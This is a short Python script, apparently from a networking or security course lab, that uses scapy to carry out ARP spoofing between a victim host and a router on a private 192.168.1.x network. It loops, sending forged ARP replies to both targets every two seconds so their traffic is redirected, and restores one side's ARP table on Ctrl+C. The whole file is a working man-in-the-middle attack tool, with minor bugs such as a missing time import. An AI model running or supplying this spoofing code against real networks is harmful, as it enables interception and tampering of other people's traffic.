import scapy.all as scapy
import network_scanner
'''Arp Spoofing Tool ''' 


# create an arp packet
# op of 1 is request
# op of 2 is response
# Victim Mac Addr 00:0c:29:ca:5e:b7 Windows Server
# Ip of second target 192.168.1.1 Virtual Router




def start_arp_attack(target1, target2):
	# Get mac of target
	mac = network_scanner.arp_scan(target1)
	# Only one item in dictionary (mac)
	mac_addr = list(mac.values())[0]
	packet = scapy.ARP(op=2, pdst=target1, hwdst=mac_addr, psrc=target2)

	#print(packet.show())
	#print(packet.summary())
	# No output
	scapy.send(packet, verbose=False)


def restore(target1, target2):
	target1_mac = network_scanner.arp_scan(target1)
	mac_addr1 = list(target1_mac.values())[0]
	print(mac_addr1)
	target2_mac = network_scanner.arp_scan(target2)
	mac_addr2 = list(target2_mac.values())[0]
	print(mac_addr2)
	packet = scapy.ARP(op=2, pdst=target1, hwdst=mac_addr1, psrc=target2,
	hwsrc=mac_addr2)
	
	scapy.send(packet, count=4, verbose=False)

# Need to continously send arp packets, otherwise arp table of 
# victims will return to normal
def continuous_arp_spoof(sent_packets_count):
	try:
		while True:
			start_arp_attack('192.168.1.134', '192.168.1.1')
			start_arp_attack('192.168.1.1', '192.168.1.134')
			sent_packets_count = sent_packets_count + 2

			print("[+] Packets Sent:" + str(sent_packets_count), flush=True)
			time.sleep(2)
	except KeyboardInterrupt:
		restore('192.168.1.134', '192.168.1.1')
		print("CTRL + C detected, Cleanup completed, Quitting .........")



continuous_arp_spoof(0)
